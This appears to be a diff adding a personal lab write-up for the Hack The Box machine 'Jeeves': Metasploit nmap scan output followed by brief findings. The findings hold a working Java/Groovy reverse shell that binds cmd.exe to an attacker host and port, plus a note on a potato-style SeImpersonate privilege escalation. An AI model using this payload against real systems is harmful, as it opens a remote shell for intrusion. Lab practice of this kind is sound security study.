@@ -1,0 +1,91 @@
+NMAP============
+
+msf6 > workspace -a Htb_Jeeves
+[] Added workspace: Htb_Jeeves
+[] Workspace: Htb_Jeeves
+msf6 > db_nmap -p- -T4 -v -sCV 10.10.10.63
+[] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 12:15 CDT
+[] Nmap: NSE: Loaded 156 scripts for scanning.
+[] Nmap: NSE: Script Pre-scanning.
+[] Nmap: Initiating NSE at 12:15
+[] Nmap: Completed NSE at 12:15, 0.00s elapsed
+[] Nmap: Initiating NSE at 12:15
+[] Nmap: Completed NSE at 12:15, 0.00s elapsed
+[] Nmap: Initiating NSE at 12:15
+[] Nmap: Completed NSE at 12:15, 0.00s elapsed
+[] Nmap: Initiating Ping Scan at 12:15
+[] Nmap: Scanning 10.10.10.63 [2 ports]
+[] Nmap: Completed Ping Scan at 12:15, 0.05s elapsed (1 total hosts)
+[] Nmap: Initiating Parallel DNS resolution of 1 host. at 12:15
+[] Nmap: Completed Parallel DNS resolution of 1 host. at 12:15, 0.03s elapsed
+[] Nmap: Initiating Connect Scan at 12:15
+[] Nmap: Scanning 10.10.10.63 [65535 ports]
+[] Nmap: Discovered open port 445/tcp on 10.10.10.63
+[] Nmap: Discovered open port 135/tcp on 10.10.10.63
+[] Nmap: Discovered open port 80/tcp on 10.10.10.63
+[] Nmap: Connect Scan Timing: About 23.33% done; ETC: 12:17 (0:01:42 remaining)
+[] Nmap: Connect Scan Timing: About 59.23% done; ETC: 12:17 (0:00:42 remaining)
+[] Nmap: Discovered open port 50000/tcp on 10.10.10.63
+[] Nmap: Completed Connect Scan at 12:17, 89.13s elapsed (65535 total ports)
+[] Nmap: Initiating Service scan at 12:17
+[] Nmap: Scanning 4 services on 10.10.10.63
+[] Nmap: Completed Service scan at 12:17, 6.20s elapsed (4 services on 1 host)
+[] Nmap: NSE: Script scanning 10.10.10.63.
+[] Nmap: Initiating NSE at 12:17
+[] Nmap: Completed NSE at 12:17, 40.03s elapsed
+[] Nmap: Initiating NSE at 12:17
+[] Nmap: Completed NSE at 12:17, 0.23s elapsed
+[] Nmap: Initiating NSE at 12:17
+[] Nmap: Completed NSE at 12:17, 0.00s elapsed
+[] Nmap: Nmap scan report for 10.10.10.63
+[] Nmap: Host is up (0.050s latency).
+[] Nmap: Not shown: 65531 filtered tcp ports (no-response)
+[] Nmap: PORT      STATE SERVICE      VERSION
+[] Nmap: 80/tcp    open  http         Microsoft IIS httpd 10.0
+[] Nmap: | http-methods:
+[] Nmap: |   Supported Methods: OPTIONS TRACE GET HEAD POST
+[] Nmap: |_  Potentially risky methods: TRACE
+[] Nmap: |http-server-header: Microsoft-IIS/10.0
+[] Nmap: |_http-title: Ask Jeeves
+[] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
+[] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[] Nmap: 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+[] Nmap: |_http-server-header: Jetty(9.4.z-SNAPSHOT)
+[] Nmap: |http-title: Error 404 Not Found
+[] Nmap: Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+[] Nmap: Host script results:
+[] Nmap: |_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
+[] Nmap: | smb-security-mode:
+[] Nmap: |   authentication_level: user
+[] Nmap: |   challenge_response: supported
+[*] Nmap: |  message_signing: disabled (dangerous, but default)
+[] Nmap: | smb2-time:
+[] Nmap: |   date: 2023-09-10T22:17:12
+[*] Nmap: |  start_date: 2023-09-10T22:14:05
+[] Nmap: | smb2-security-mode:
+[] Nmap: |   3:1:1:
+[] Nmap: |_    Message signing enabled but not required
+[] Nmap: NSE: Script Post-scanning.
+[] Nmap: Initiating NSE at 12:17
+[] Nmap: Completed NSE at 12:17, 0.00s elapsed
+[] Nmap: Initiating NSE at 12:17
+[] Nmap: Completed NSE at 12:17, 0.00s elapsed
+[] Nmap: Initiating NSE at 12:17
+[] Nmap: Completed NSE at 12:17, 0.00s elapsed
+[] Nmap: Read data files from: /usr/bin/../share/nmap
+[] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 135.98 seconds
+
+
+========Findings ==============
+
+findings
+
+String host="10.10.14.6";
+int port=5560;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+utilized potato attackt o abuse seimpersonate priviledge as a service to get priv esc. 
+
+
+
